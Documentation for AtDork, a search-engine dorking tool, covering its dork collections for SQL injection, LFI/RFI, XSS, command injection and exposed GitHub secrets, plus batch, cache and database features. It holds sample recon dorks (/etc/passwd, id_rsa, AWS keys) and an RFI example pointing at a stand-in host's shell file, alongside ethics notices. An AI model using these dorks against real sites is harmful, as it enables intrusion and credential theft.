docs.title: Common Dorks (@common/)
docs.text:
Data location: these dorks live in the Atdork-DB repository under @folders. Browse @common in the web catalog → — search with atdork search common, install with atdork install @common.

The @common/ folder is the core of AtDork's dork collections. It groups everyday web-vulnerability recon patterns into five files, split by vulnerability class so you can load exactly the category you need for a given engagement.

@common/
├── common1.txt   # SQL Injection & IDOR
├── common2.txt   # LFI / RFI & Path Disclosure
├── common3.txt   # XSS & HTML Injection
├── common4.txt   # File Upload Bypass, RCE, Command Injection & SSRF
└── common5.txt   # phpinfo/debug pages, admin API endpoints, YAML files

Install this collection (optional — refs also work straight from Atdork-DB):

atdork install @common

Then browse what's available:

atdork --list-database-dork

docs.title: common1.txt – SQL Injection & IDOR
docs.text:
Aspect Description Purpose Finds numeric/ID parameters (?id=, ?cat=, ?pid=, etc.) that are often left unvalidated, potentially vulnerable to SQL Injection or IDOR (accessing another user's data by manipulating an ID). Common targets product.php?id=, view.php?id=, ?cat=, ?page=, admin panels (admin.php?id=), profile/user pages (profile.php?id=). Sample entries text inurl:product.php?id= inurl:view.php?id= inurl:?cat= site:target.com inurl:product.php?id= inurl:product.php?id= intext:"mysql" inurl:product.php?id= union

Usage example:

# Load all SQLi/IDOR dorks and run them
atdork --database-dork @common/common1 -r 30

# Preview instead of running
atdork --database-dork @common/common1 --database-preview

docs.title: common2.txt – LFI / RFI & Path Disclosure
docs.text:
Aspect Description Purpose Finds parameters that include a file (template, language, page). Without validation this can be exploited to read sensitive system files (LFI, e.g. /etc/passwd) or execute a file hosted on an external server (RFI). Common targets ?page=, ?file=, ?path=, ?template=, ?lang=, ?include=. Sample entries text inurl:?page= inurl:?file= inurl:?page= etc/passwd inurl:?page= intext:"failed to open stream" inurl:?page= wp-config.php intitle:"index of" "config"

Usage example:

atdork --database-dork @common/common2 -r 20 --filter-vuln lfi

docs.title: common3.txt – XSS & HTML Injection
docs.text:
Aspect Description Purpose Finds parameters that reflect or store user input on a page without sanitization, potentially vulnerable to Cross-Site Scripting. Common targets ?q=, ?search=, ?s=, ?comment=, ?feedback=, ?name=, ?email=. Sample entries text inurl:?q= inurl:?search= inurl:?q= intext:"<script>" inurl:comment.php intext:"<script>" site:.go.id inurl:?q= intext:"cari"

Usage example:

atdork --database-dork @common/common3 --database-r 15 --database-seed 1

docs.title: common4.txt – File Upload Bypass, RCE, Command Injection & SSRF
docs.text:
Aspect Description Purpose Finds weak file-upload features, parameters that execute system commands, and parameters that fetch content from another URL (SSRF). This is the most critical category, as it can lead to full server takeover. Common targets upload.php, ?cmd=, ?exec=, ?ping=, ?url=, ?fetch=, ?proxy=, phpinfo.php. Sample entries text inurl:upload.php inurl:?cmd= inurl:?url= inurl:phpinfo.php inurl:upload.php intext:"failed to move" inurl:ping.php?ip= intext:"PING"

Usage example:

atdork --database-dork @common/common4 -r 25 --exec "curl -sI {}"

docs.title: common5.txt – phpinfo, Debug Pages & Admin API Endpoints
docs.text:
Aspect Description Purpose Finds exposed diagnostic pages (phpinfo.php, info.php) and enterprise admin API endpoints — the leftovers of misconfigured deployments that often leak versions, paths, and internal configuration. Common targets inurl:phpinfo.php, inurl:info.php, /api/jsonws (Liferay), /dana-na/ & /OA_HTML (Oracle e-Business), ext:yml config files. Size 708 dorks — the largest file in @common/.

Usage example:

atdork --database-dork @common/common5 -r 25

docs.title: Combining multiple categories
docs.text:
# SQLi + LFI in one batch
atdork --database-dork @common/common1,@common/common2 -r 40 --format json -o recon.json

# All 5 categories, random sample of 50 dorks, reproducible via seed
atdork --database-dork @common/common1,@common/common2,@common/common3,@common/common4,@common/common5 \
  --database-r 50 --database-seed 7 --database-preview

docs.title: GitHub Secret-Exposure Dorks (@github/)
docs.text:
Data location: these dorks live in the Atdork-DB repository under @folders. Browse @github in the web catalog → — search with atdork search github, install with atdork install @github/git-dorks.txt.

This category is fundamentally different from the SQLi/LFI/RFI/XSS categories elsewhere in this database. Those find a potentially vulnerable parameter that still requires authorization and further work to confirm. GitHub dorks find already-exposed, live credentials — the moment a query hits, you're looking at a real API key, password, or private key that someone actually committed.

Because of that, the primary intended use of this page is auditing your own organization's repositories (and their commit history — secrets often survive in old commits even after being "removed") for accidental credential leaks, not searching the wider internet for other people's keys.

@github/
├── git-dorks.txt             # filename:/extension:/language: secret file patterns (513)
├── githubdorks.txt           # GitHub secret-hunting dork collection               (180)
├── github-dorks-techgaun.txt # techgaun/github-dorks collection                     (96)
├── github.txt                # Small curated set of GitHub queries                  (19)
└── git-files-dorks.txt       # File-path oriented GitHub searches                   (11)

docs.title: What this category looks for
docs.text: Aspect Description Purpose Finds files, filenames, and code patterns known to contain live credentials that were accidentally committed to a public repo. Common patterns filename:.env, filename:id_rsa, filename:.npmrc _auth, extension:pem private, filename:credentials aws_access_key_id, filename:wp-config.php. Certificate/key patterns "-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN PRIVATE KEY-----", "-----BEGIN CERTIFICATE-----" extension:pem. Service-specific tokens HEROKU_API_KEY, shodan_api_key, DATADOG_API_KEY, xoxp OR xoxb (Slack tokens), SF_USERNAME salesforce. User/org discovery user:, org:, in:login, in:email, created: date-range filters — used to scope a search to a specific account or org rather than the whole platform.

docs.title: Sample entries
docs.text:
filename:.env DB_USERNAME NOT homestead
filename:id_rsa or filename:id_dsa
filename:credentials aws_access_key_id
extension:pem private
extension:sql mysql dump password
filename:.npmrc _auth
filename:.dockercfg auth
filename:settings.py SECRET_KEY
filename:secrets.yml password
HEROKU_API_KEY language:shell
"https://hooks.slack.com/services/"

docs.title: Usage — auditing your own org
docs.text:
# Scope every search to your own GitHub org/account before running anything
atdork --database-dork @github/git-dorks --backend google -r 20

Since these are GitHub-specific search operators, run them scoped to your own org, e.g. by appending org:your-org-name or user:your-username to each query (edit the dork file, or use --exec to append a scope suffix per line) rather than running them unscoped.

# Preview what's in the file before running anything
atdork --database-dork @github/git-dorks --database-preview

docs.title: If you find a live secret
docs.text:
This is the part that matters more than the dorks themselves:

  1. If it's yours/your org's — rotate the credential immediately, then scrub it from git history (it's not enough to delete it in a new commit; use git filter-repo or GitHub's secret-removal tooling, since old commits remain accessible).
  2. If it belongs to someone else — do not use it, log into anything with it, or explore what it grants access to. Using a credential you weren't authorized to have, even one you "just found," is unauthorized access in most jurisdictions regardless of how it was obtained.
  3. Report it responsibly — GitHub has a process for reporting exposed secrets, and most cloud providers (AWS, Heroku, etc.) have abuse-reporting channels that will revoke a leaked key once notified. If the repo belongs to a company with a bug bounty program, report it through that program instead of any other channel.
  4. GitHub's own secret scanning and push protection features exist precisely to catch this class of leak automatically — enabling them on your own repos is a better long-term fix than periodic manual dorking.

docs.text:
This category is intended only for:

  1. Auditing repositories you own or are authorized to audit (your own org, or as part of an authorized security assessment).
  2. Official Bug Bounty / responsible disclosure programs, where finding exposed secrets in a company's public repos is explicitly in scope.
  3. Academic/educational research into secret-scanning techniques, without acting on any secret discovered.

Strictly prohibited: using a credential you find to access an account, system, or data you aren't authorized to access; this applies even if the credential was trivial to find. Accessing a system with someone else's leaked password or key is unauthorized access, not "finding an unlocked door."

docs.title: LFI / RFI & Path Disclosure Dorks (@lfi/)
docs.text:
Data location: these dorks live in the Atdork-DB repository under @folders. Browse @lfi in the web catalog → — search with atdork search lfi, install with atdork install @lfi/lfi.txt.

This category targets parameters that pull in a file, template, or path fragment on the server side. When the value isn't validated, it can be abused for Local File Inclusion (reading files like /etc/passwd or app config) or Remote File Inclusion (executing a file hosted on an external server).

@lfi/
└── lfi.txt   # Path-inclusion parameters across common CMS/forum/gallery software

docs.title: What this category looks for
docs.text: Aspect Description Purpose Finds parameters that build a file path from user input — old CMS/forum/gallery/calendar packages are especially prone to this because they often pass a "base path" or "template" variable straight into an include()/require() call. Common parameter names ?path=, ?file=, ?page=, ?include=, ?dir=, ?root_dir=, ?basepath=, ?systempath=, ?configFile=, ?template=, ?lang=. Typical vulnerable software Older PHP-based gallery, calendar, forum, and CMS add-ons (Coppermine, phpBB add-ons, Joomla/Mambo components, agendax, dotProject, and similar) — the pattern is well documented precisely because these packages were common LFI targets in the mid-2000s and the parameter names haven't changed much since.

docs.title: Sample entries
docs.text:
includes/header.php?systempath=
index.inc.php?PATH_Includes=
modules/mod_mainmenu.php?mosConfig_absolute_path=
pivot/modules/module_db.php?pivot_path=
zentrack/index.php?configFile=
inc/pipe.php?HCL_path=
include/new-visitor.inc.php?lvc_include_dir=
myPHPCalendar/admin.php?cal_dir=
dotproject/modules/projects/addedit.php?root_dir=
modules/coppermine/themes/default/theme.php?THEME_DIR=
index.php?page=
index.php?file=
index.php?include=
index.php?basepath=

Usage:

# Load and run the LFI category
atdork --database-dork @lfi/lfi -r 25

# Combine with the general LFI category from the common set
atdork --database-dork @lfi/lfi,@common/common2 --database-r 30 --filter-vuln lfi

# Preview before running
atdork --database-dork @lfi/lfi --database-preview

docs.title: Confirming a real LFI, not just a matching URL
docs.text:
A dork match only tells you the parameter name exists — not that it's exploitable. Use --filter-vuln lfi (or manually check for the classic error strings below) before treating anything as a confirmed finding:

"failed to open stream: No such file"
"include_once(): Failed opening"
"require_once(): Failed opening"

docs.title: ✅ Correct, Ethical Usage
docs.text:
1. Confirm written authorization before targeting any domain you don't own.
  2. Scope every dork with site:target.com before running at scale.
  3. Stop at confirming the vulnerability exists (e.g. via a harmless path like /etc/hostname or a known-safe test file) — don't pull sensitive files as "proof."
  4. Add delay between requests (--delay) so you aren't mistaken for abuse.
  5. Report findings professionally through an official bug bounty program.

See also: Common Dorks for the general LFI/SQLi/XSS/RCE categories, Bing & DuckDuckGo Dorks, and the Database Dorks overview for the full Atdork-DB folder structure.

Note on source material: the raw list this category is drawn from also contained unrelated content — a set of default/unauthenticated IP-camera admin-interface dorks (Axis/Panasonic-style ViewerFrame, axis-cgi, liveapplet patterns) and a large batch of credential/secret-harvesting dorks (exposed .pwd/.dat files, saved FTP/VNC/chat credentials, etc.). Both were left out of this page — the camera dorks because using them typically means viewing live footage of people who never consented to being watched, and the credential dorks because they target already-exposed secrets belonging to someone else rather than a parameter/vulnerability class. If you want, I can document those as their own separate, clearly-labeled pages so contributors know what they're opting into, rather than folding them silently into "LFI."

docs.title: RFI Dorks — Remote File Inclusion (@rfi/)
docs.text:
Data location: these dorks live in the Atdork-DB repository under @folders. Browse @rfi in the web catalog → — search with atdork search rfi, install with atdork install @rfi/rfi.txt.

RFI is the sibling of LFI: instead of pulling in a local file on the server, the vulnerable parameter fetches and executes a file from a URL the attacker controls (?include=http://evil.example/shell.txt). It's historically one of the most severe web bugs because a successful RFI often means immediate remote code execution.

@rfi/
└── rfi.txt   # Path/include parameters in older PHP CMS, forum, and gallery packages

This category overlaps heavily with LFI Dorks — the same parameter names show up in both because the underlying flaw is identical (unvalidated include()/require()); the only difference is whether the target application allows a remote URL (allow_url_include) or is restricted to local paths.

docs.title: What this category looks for
docs.text: Aspect Description Purpose Finds parameters passed straight into a PHP include/require (or equivalent) without validating that the value is a safe local path — the classic old-CMS/forum/gallery/calendar add-on pattern. Common parameter names ?include=, ?inc=, ?inc_dir=, ?root_dir=, ?basepath=, ?path=, ?libpath=, ?config[path]=, ?theme_path=, ?GALLERY_BASEDIR=. Typical vulnerable software The same generation of PHP add-ons as the LFI set — Joomla/Mambo components (com_*), phpBB/YaBB forum add-ons, gallery/calendar plugins (Coppermine, agendax, dotProject), and small standalone scripts from the mid-2000s PHP ecosystem. Confirming RFI vs. LFI RFI requires the target's PHP config to allow remote includes (allow_url_fopen/allow_url_include — disabled by default in modern PHP). Most matches today will only be exploitable as LFI, if at all; treat an RFI hit as a lead to verify, not a confirmed finding.

Usage:

# Load and run the RFI category
atdork --database-dork @rfi/rfi -r 25

# Combine with the LFI category since they target the same flaw class
atdork --database-dork @rfi/rfi,@lfi/lfi --database-r 30 --filter-vuln lfi

# Preview before running
atdork --database-dork @rfi/rfi --database-preview

docs.title: Confirming a real finding
docs.text:
A dork match is only a parameter name — it tells you nothing about whether the include is actually unsafe. Before treating anything as a finding:

  1. Test with a harmless, clearly-inert value first (not a live shell) to see whether the parameter reaches an include()/require() at all.
  2. Look for the classic error strings when a value fails to load: 
    "failed to open stream: No such file"
"include_once(): Failed opening"
"require_once(): Failed opening"
  3. Only escalate to demonstrating remote inclusion within the rules your authorization/program scope actually allows — for most bounty programs, a benign proof (e.g. pointing at a harmless file you control and showing its content rendered) is sufficient; you don't need to drop a working shell to prove impact.

docs.title: ⚠️ Disclaimer & Legal Notice
docs.text:
This category is intended only for:

  1. Security testing on websites/servers you own.
  2. Official Bug Bounty programs with explicit written authorization from the target owner.
  3. Academic/educational security research in a controlled environment (university labs, legal CTF platforms like HackTheBox, TryHackMe).

Strictly prohibited: breaking into systems without authorization, uploading/executing malicious payloads on systems you don't have permission to test, planting backdoors, or defacing websites. An RFI finding that escalates to code execution is a serious impact — report it through the program's process rather than using it to pivot further than your authorization covers.

docs.title: Introduction
docs.text:
AtDork's batch processing system allows you to run multiple dorks in a single session, either sequentially or in parallel. This is essential for large-scale OSINT operations where you need to scan multiple targets or run multiple dorks without manual intervention.

The batch system includes progress tracking, resume capability, database storage, and configurable concurrency to balance speed and reliability.

docs.title: What It Does
docs.text: Feature Description Batch File Support Run dorks from a text file (one per line) Parallel Execution Run multiple queries simultaneously (--concurrency) Sequential Fallback Automatically switches to sequential mode if too many failures occur Resume Capability Resume interrupted batches with --resume Database Storage Store all results in SQLite for history and deduplication Progress Tracking Real-time progress bar with percentage and elapsed time Per-Query Output Save each query result to a separate file (--output-dir) Single File Output Save all results to a single JSON/CSV file (-o)

docs.title: 1. Batch File Processing
docs.text:
Input File (dorks.txt): 

# Comments are ignored
site:example.com filetype:pdf
inurl:admin login
intitle:"index of" "backup"

Processing Flow: 

1. User provides --batch-file dorks.txt
   ↓
2. AtDork reads the file, ignoring blank lines and comments
   ↓
3. Each line becomes a separate query
   ↓
4. Queries are executed according to --concurrency setting
   ↓
5. Results are collected and saved to output

docs.title: 2. Concurrency Modes
docs.text:
Mode Description When to Use Sequential (--concurrency 1) One query at a time Default; safe but slower Parallel (--concurrency 2-10) Multiple queries simultaneously Faster for large batches; requires stable proxies

Parallel Execution Flow: 

1. Create ThreadPoolExecutor with N workers
   ↓
2. Submit all queries to the pool
   ↓
3. Results are collected as they complete
   ↓
4. Progress bar updates in real-time
   ↓
5. If too many consecutive failures:
   └─ Automatically fallback to sequential mode

docs.title: 3. Fallback Mechanism
docs.text:
When running in parallel mode, AtDork monitors for failures:

  • Tracks consecutive failures per query
  • If 3 consecutive failures occur, automatically switches to sequential mode
  • This prevents wasting resources on a failing batch

Fallback Flow: 

Parallel Mode Running
   ↓
Failure 1 → Count = 1
   ↓
Failure 2 → Count = 2
   ↓
Failure 3 → Count = 3 → FALLBACK TO SEQUENTIAL
   ↓
Sequential Mode
   ↓
Continue with remaining queries one by one

docs.title: 4. Resume Mechanism
docs.text:
When running with --resume, AtDork:

  1. Checks the database for queries with status pending or failed
  2. Re-runs only those queries
  3. Skips already completed queries
  4. Updates the database with new results

Database Schema: 

CREATE TABLE IF NOT EXISTS queries (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    query_text TEXT UNIQUE NOT NULL,
    status TEXT NOT NULL DEFAULT 'pending',
    created_at TEXT NOT NULL,
    updated_at TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS results (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    query_id INTEGER NOT NULL,
    title TEXT,
    href TEXT,
    body TEXT,
    raw_json TEXT,
    created_at TEXT NOT NULL,
    FOREIGN KEY (query_id) REFERENCES queries(id),
    UNIQUE(query_id, href)
);

docs.title: 5. Database Storage
docs.text:
Benefits: - Resume: Interrupted batches can be resumed - History: View past searches with --history - Deduplication: Prevent duplicate URLs in the same batch - Export: Export all data to JSON or CSV

Database Commands: 

# View history
atdork --history

# Resume pending queries
atdork --resume

# Export to JSON
atdork --export-db results.json

# Export to CSV
atdork --export-db results.csv

docs.title: 6. Progress Tracking
docs.text:
AtDork displays a real-time progress bar:

Running batch queries... ━━━━━━━━━━━━━━━━━━━━ 45% (9/20) ⏱️ 12.3s

Progress Bar Components: - Spinner: Indicates activity - Description: Current query or status - Bar: Visual progress - Percentage: Completion percentage - Counter: Current/Max queries - Elapsed Time: Time since batch started

docs.title: Cache System
docs.text:
# Cache System

## Introduction

The Cache System stores search results locally in a SQLite database, preventing redundant requests to search engines, reducing bandwidth usage, and enabling **offline access** to previously fetched results.

## Functions

| Flag | Description | Default |

|------|-------------|---------|

| --cache | Enable caching. Every search result is saved and served from cache when available. | |

| --cache-only | Only use cached results; never contact search engines. | |

| --cache-ttl N | Time‑to‑live in hours. Cached entries older than this are ignored. | 24 |

| --clear-cache | Delete all cached entries before starting the session. | |

| --cache-db PATH | Specify a custom cache database file. | atdork\_cache.db |

## Usage Examples

\# Cache all search results for 48 hours

atdork -q "site:gov filetype:pdf" -r 20 --cache --cache-ttl 48



\# Use only cached data (offline mode)

atdork -q "site:gov filetype:pdf" -r 20 --cache-only



\# Clear old cache and start fresh

atdork --clear-cache



\# Use a custom cache location

atdork -q "test" --cache --cache-db /path/to/my\_cache.db

## How It Works

1. **Initialization**

When any cache flag is used, a SearchCache object is created. It opens (or creates) a SQLite database file (atdork\_cache.db by default) and ensures the api\_cache table exists. Expired entries are automatically removed on startup.

2. **Cache Write**

After a successful search, the query, backend engine, normalized parameters, and the result list are stored as a new row. The expires\_at column is set to the current time plus the TTL (in hours). If a row with the same query, engine, and parameters already exists, it is updated (upsert).

3. **Cache Read**

Before performing a search, AtDork checks the cache for an exact match:

- Query string

- Backend engine

- Normalized parameters (region, safesearch, timelimit, max_results)

If a non‑expired row is found, the cached results are returned immediately without contacting any search engine. The hit\_count and last\_accessed fields are updated.

4. **Cache‑Only Mode**

When --cache-only is active, AtDork **only** looks up the cache. If no valid cache entry exists, it returns zero results without making any network request.

5. **Cache Clearing**

--clear-cache deletes every row from the api\_cache table before the session begins, forcing fresh data to be fetched.

6. **Cache Statistics**

The get\_stats() method provides a summary of total entries, expired entries, total hits, and a list of engines that have cached data.

The cache key is built from the query, engine, and a sorted JSON representation of the search parameters, ensuring consistent and collision‑free lookups.

docs.title: Introduction
docs.text: AtDork can persistently store all queries and their results in a SQLite database. This enables resuming interrupted batches, viewing search history, deduplication across sessions, and exporting everything to JSON/CSV for reporting and analysis.

docs.title: Functions
docs.text: Flag Description Default --db-path PATH Database file path. atdork.db --resume Continue a previously interrupted batch (re‑runs queries with pending or failed status). --history Display a list of all previously executed queries with their status. --no-dedup Disable global URL deduplication. By default, duplicate URLs across queries are skipped. --export-db PATH Export the entire database to a JSON or CSV file (format is guessed from the file extension).

docs.title: Usage Examples
docs.text:
# Resume an interrupted batch
atdork --resume

# View past searches
atdork --history

# Export all stored results to JSON
atdork --export-db all_results.json

# Export to CSV
atdork --export-db all_results.csv

# Disable deduplication (keep every URL even if seen before)
atdork -q "test" --no-dedup

# Use a custom database location and view history
atdork --db-path /secure/path/atdork.db --history

docs.title: How It Works
docs.text:
1. Database Structure The Database class (from core/database.py) creates two tables:
  2. queries – stores each unique query text, its status (pending, running, completed, failed), and timestamps.

  3. results – stores individual search results (title, URL, snippet, and raw JSON). A UNIQUE(query_id, href) constraint prevents duplicate URLs for the same query.

  4. During a Search

  5. Every query is inserted (or updated) with status pending, then set to completed (or failed) after execution.
  6. Each result is inserted individually. If the same URL already exists for that query, the row is ignored – this is the built‑in deduplication.

  7. Use --no-dedup to force all results to be stored, even if they are duplicates.

  8. Resuming a Batch

  9. --resume reads all queries with status pending or failed from the database.
  10. Those queries are re‑executed, and their status is updated accordingly. Completed queries are skipped.

  11. This allows you to recover from a crash or an intentional pause without repeating work.

  12. Search History

  13. --history simply prints a table of all queries stored in the database, along with their status and timestamps. It gives you an overview of past activity.

  14. Exporting Data

  15. --export-db <file> joins the queries and results tables and writes:
    • A JSON file containing a dictionary {query_text: [results]}, or
    • A CSV file with columns query_text, title, href, body.

  16. The format is auto‑detected from the file extension.

  17. Thread Safety The database uses SQLite’s WAL (Write‑Ahead Logging) mode and proper locking, so it is safe for concurrent access during multi‑threaded batch processing.

This persistent storage makes AtDork suitable for long‑running engagements, audit trails, and professional reporting.

docs.title: Introduction
docs.text:
AtDork ships code only — the dork data lives in the separate Atdork-DB repository, checked out locally (by default ~/Atdork-DB) and indexed by Index.idn. The current index contains ~978,000 dorks across 100+ files in 29 @folders, including:

  • GHDB (Google Hacking Database) from Exploit-DB (@ghdb/, refreshed weekly)
  • Search engine specific dorks (Bing, DuckDuckGo, Google, Yandex, Shodan, Censys)
  • Platform and CMS specific dorks (@cms/, @github/, @cloud/)
  • Vulnerability focused dorks (@lfi/, @rfi/, @cve/, @vuln/)
  • Industry and niche specific dorks (@crypto/, @gaming/, @iot/, @bug-bounty/)

The Database Dork feature lets you load, filter, and execute these dorks without manual copy-pasting. Dorks are addressed with package refs such as @cve/cve_1.txt, whole folders such as @ghdb, and comma-separated combinations — plus random selection and reproducible runs via RNG seeds. A built-in package manager (atdork search / install / uninstall / installed) lets you cache packages locally in ~/.atdork/packages/.

This is distinct from the GHDB Scraper (--ghdb-scraper), which performs live HTTP fetching from Exploit-DB. The Database Dork feature reads from local files — no network required.

Flag Type Description --db-repo PATH string Path to the Atdork-DB checkout (default: auto-discover, or config key db_repo; env ATDORK_DB_REPO) --db-repo-url URL string Git URL of the Atdork-DB repository (used by atdork update) --package-dir PATH string Override the package store (default: ~/.atdork/packages) --list-database-dork flag List all index entries as @folder/file.txt with dork counts and sizes --database-dork SPEC string Load dorks from package refs. Comma-separated. Accepts @folder/file.txt, x/file.txt shorthand, bare file names, and whole folders --database-r N int Randomly select N dorks from the combined set --database-path PATH string Root of a legacy local database copy --database-preview flag Preview loaded dorks without running a search --database-seed N int Optional RNG seed for reproducible --database-r --extract-database flag Legacy: copy a local ./database directory to a destination --extract-database-to PATH string Custom destination for --extract-database --database-dork-extract PATH string Legacy shortcut: copy a local database to PATH --force flag Overwrite existing destination when extracting

Note: AtDork no longer bundles a dork database — it ships code only. The --extract-database, --extract-database-to, --database-dork-extract, and --force flags operate on a legacy local ./database directory you provide (e.g. an old extraction kept for offline editing). New setups should use the Atdork-DB checkout and package refs instead.

docs.title: 1. Browse and List Available Packages
docs.text:
# Search the index by keyword (returns @folder/file.txt refs)
atdork search wp

# List every index entry with dork counts and sizes
atdork --list-database-dork

atdork search wp prints matching refs such as @cms/wp.txt (26,324 dorks) and @cms/wp2.txt (474 dorks), ready to pass to --database-dork or atdork install.

docs.title: 2. Install Packages Locally
docs.text:
# Install a whole folder into the package store
atdork install @cms

# Install a single file
atdork install @cve/cve_1.txt

# Show what is installed
atdork installed

# Remove an installed package
atdork uninstall @cve/cve_1.txt

Installed copies land in ~/.atdork/packages/ and take priority when resolving --database-dork refs.

docs.title: 3. Update the Atdork-DB Checkout
docs.text:
# git pull the Atdork-DB checkout and rebuild the index
atdork update

# Show or manually rebuild the manifest
atdork index
atdork index --build

docs.title: 4. Load Dorks from a Single File
docs.text:
# Canonical ref: folder + file
atdork --database-dork @ghdb/01_footholds.txt -r 10 -v

# The .txt extension is optional
atdork --database-dork @ghdb/01_footholds

# Bare file name, matched against the index (.txt auto-appended)
atdork --database-dork 01_footholds

# Shorthand: unique single-letter folder prefix
atdork --database-dork c@cve_1.txt

docs.title: 5. Load Dorks from Multiple Files
docs.text:
# Combine refs, bare names, and shorthand in one command
atdork --database-dork @ghdb/01_footholds.txt,@cms/wp.txt -r 50
atdork --database-dork @cve/cve_1.txt,c@cve_1.txt,01_footholds --database-preview

All dorks are merged into a single list, deduplicated while preserving order.

docs.title: 6. Load Whole Folders
docs.text:
# Load EVERY .txt member of a folder
atdork --database-dork @ghdb --database-r 100 -r 10

# Combine multiple folders
atdork --database-dork @ghdb,@lfi --database-r 50 --database-preview

# A folder plus a specific file
atdork --database-dork @bug-bounty,@cve/cve_1.txt --database-preview

docs.title: 7. Random Selection
docs.text:
# Pick 10 random dorks from one file
atdork --database-dork @ghdb/01_footholds --database-r 10 -r 5

# Pick 100 random dorks from an entire folder
atdork --database-dork @github --database-r 100 -r 10

If --database-r exceeds the total dork count, all dorks are used and a warning is logged.

docs.title: 8. Reproducible Random Selection
docs.text:
# Same seed = same selection every time
atdork --database-dork @ghdb/01_footholds --database-r 10 --database-seed 42 -r 5

Useful for benchmarking, sharing configurations, or replaying specific dork sets.

docs.title: 9. Preview Without Executing
docs.text:
atdork --database-dork 01_footholds,@bing/bing1,@cms/wp \
  --database-r 5 --database-preview --database-seed 7

Preview shows the loaded dorks without executing them as search queries.

docs.title: 10. Custom Local Copy (Legacy)
docs.text:
# Point at a local database root (e.g. a hand-edited copy)
atdork --database-path /opt/my-dorks --database-dork custom_file --database-r 50

Legacy subdirectory paths such as /bing/bing1 only resolve against a local ./database directory or a --database-path root. In index mode, use @-refs instead (e.g. @bing/bing1).

docs.title: Directory Structure
docs.text:
Dork data lives in the Atdork-DB checkout (default ~/Atdork-DB; override with --db-repo or ATDORK_DB_REPO):

Atdork-DB/
├── Index.idn               # generated manifest: @folder/file.txt|sha256|bytes|dork-lines|description
├── @exploit-db/  @ghdb/  @shodan/  @censys/  @cloud/  @cms/  @common/  @crypto/
├── @cve/  @duckduckgo/  @bing/  @google/  @yandex/  @gaming/  @github/  @lfi/  @rfi/
├── @admin/  @sensitive/  @social/  @network/  @vuln/  @shopping/  @movie/  @onion/
├── @bug-bounty/  @carding/  @iot/
└── scripts/ + .github/workflows/   # weekly GHDB auto-refresh into @ghdb/

Installed packages are cached separately:

~/.atdork/packages/
└── @cms/wp.txt   # one copy per installed package ref

docs.title: Package Reference Grammar
docs.text:
--database-dork (and --batch-file) accept these ref forms:

Ref Meaning @cve/cve_1.txt Canonical: folder + file c@cve_1.txt Shorthand: unique folder prefix — c resolves to the folder starting with c that contains cve_1.txt cve_1.txt / 01_footholds Bare file name, matched against the index (.txt auto-appended) @cve Whole folder — loads every .txt member

docs.title: Resolution Order
docs.text:
When you run --database-dork, AtDork resolves each ref in this order:

  1. Installed copy in the package store (~/.atdork/packages/)
  2. The Atdork-DB checkout (~/Atdork-DB, or --db-repo / ATDORK_DB_REPO)
  3. A legacy local ./database directory, or the root given by --database-path PATH

Unknown refs print a Did you mean: suggestion with close matches from the index, and atdork search <keyword> finds the right package by name.

docs.title: Path Safety
docs.text:
All file specs are sanitized to prevent directory traversal attacks:

  • Parent traversal (..) is rejected with ValueError
  • Absolute paths (C:\..., /etc/passwd) are rejected
  • Legacy subdirectory paths (/bing/bing1) are only accepted against a local database root; index mode uses @-refs

docs.title: Random Selection Algorithm
docs.text: --database-r N uses random.sample() without replacement from the deduplicated dork list. With --database-seed S, a random.Random(S) instance is created, guaranteeing identical output across runs and Python versions.

docs.title: Integration with Other Features
docs.text:
Database dorks merge with queries from --template, -q, and --batch-file (the same package refs work there too):

# Combine database dorks + template + custom query
atdork \
  --database-dork @ghdb/01_footholds,@bing/bing1 --database-r 20 \
  --template sqli --target example.com \
  -q "site:example.com filetype:pdf" \
  -r 10 --concurrency 3 --verbose

# Batch-file accepts package refs directly
atdork --batch-file @cve/cve_1.txt -r 10

# Filter results for WordPress vulnerabilities
atdork --database-dork @ghdb/09_files_containing_passwords,@cms/wp \
  --filter-vuln wordpress -r 10

# Execute command on discovered URLs
atdork --database-dork @ghdb/12_pages_containing_login_portals,@common/common1 \
  --database-r 50 --exec "curl -s -I {} | head -1" --exec-parallel 5

# Send results to Discord
atdork --database-dork @ghdb/08_files_containing_juicy_info,@github/git-dorks \
  --database-r 100 --notify discord:https://discord.com/api/webhooks/...

docs.title: Quick Recon
docs.text:
# Run a randomized sample across multiple categories
atdork --database-dork @ghdb/01_footholds.txt,@ghdb/03_sensitive_directories.txt,@ghdb/12_pages_containing_login_portals.txt,@common/common1 \
  --database-r 30 --database-seed 42 \
  -r 10 --concurrency 3 --verbose \
  --output-dir recon_results/

docs.title: Password and Token Audit
docs.text:
atdork --database-dork @ghdb/09_files_containing_passwords.txt,@github/git-dorks,@github/githubdorks \
  --database-r 50 -r 15 --output passwords.json --format json

docs.title: CMS Vulnerability Scan
docs.text:
# Install once, then scan
atdork install @cms

atdork --database-dork @cms/wp,@cms/joomla,@cms/laravel \
  --database-r 200 --target example.com \
  -r 20 --concurrency 5 --cache --cache-ttl 24

docs.title: Search Engine Specific
docs.text:
# Bing-specific dorks
atdork --database-dork @bing/bing1,@bing/bing2 --database-r 50

# DuckDuckGo-specific dorks
atdork --database-dork @duckduckgo/ddg1 --database-r 30

docs.title: Reproducible Daily Scan
docs.text:
atdork --database-dork @ghdb/08_files_containing_juicy_info.txt,@common/common2,@common/common3 \
  --database-r 100 --database-seed 1337 \
  -r 10 --cache --cache-ttl 24 \
  --notify slack:https://hooks.slack.com/services/...

docs.title: Bug Bounty Focus
docs.text:
atdork --database-dork @bug-bounty --database-r 50 --target target.com \
  -r 10 --concurrency 5 --output bug-bounty-results.json

docs.title: Custom Local Dork File
docs.text:
# 1. Create a local copy root
mkdir -p mydorks/internal
echo 'site:mycompany.com intitle:"confidential"' > mydorks/internal/company_secrets.txt

# 2. Use your file alongside indexed packages
atdork --database-path mydorks/ --database-dork /internal/company_secrets,@common/common1 -r 20

docs.title: Database directory not found
docs.text:
Fix: AtDork expects the Atdork-DB checkout. Either clone it and point AtDork at it, or use a local copy:

# Clone the data repo once
git clone https://github.com/amnottdevv/Atdork-DB ~/Atdork-DB

# Or point AtDork at an existing checkout
atdork --db-repo /path/to/Atdork-DB ...
export ATDORK_DB_REPO=/path/to/Atdork-DB

# Or use a local database copy
atdork --database-path /path/to/local/db --database-dork <ref>

docs.title: Database dork file not found
